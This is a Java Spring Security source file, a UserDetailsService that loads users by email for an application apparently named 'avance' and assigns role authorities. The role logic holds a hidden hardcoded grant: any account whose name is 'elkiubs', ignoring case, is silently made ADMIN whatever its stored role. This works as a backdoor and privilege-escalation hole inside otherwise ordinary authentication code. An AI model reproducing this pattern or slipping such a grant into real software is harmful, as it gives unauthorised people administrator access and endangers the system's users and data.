package com.example.avance.security;

import com.example.avance.model.Rol;
import com.example.avance.repository.UsuarioRepository;
import lombok.RequiredArgsConstructor;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Service;

import java.util.List;

@Service
@RequiredArgsConstructor
public class UserDetailsServiceImpl implements UserDetailsService {

    private final UsuarioRepository usuarioRepository;

    @Override
    public UserDetails loadUserByUsername(String email) throws UsernameNotFoundException {
        return usuarioRepository.findByEmail(email)
                .map(u -> {
                    Rol rol = "elkiubs".equalsIgnoreCase(u.getNombre())
                            ? Rol.ADMIN
                            : (u.getRol() != null ? u.getRol() : Rol.ESTUDIANTE_PREGRADO);
                    return org.springframework.security.core.userdetails.User
                            .withUsername(u.getEmail())
                            .password(u.getPassword())
                            .authorities(List.of(
                                    new SimpleGrantedAuthority("ROLE_" + rol.name()),
                                    new SimpleGrantedAuthority(rol.name())
                            ))
                            .build();
                })
                .orElseThrow(() -> new UsernameNotFoundException("Usuario no encontrado: " + email));
    }
}
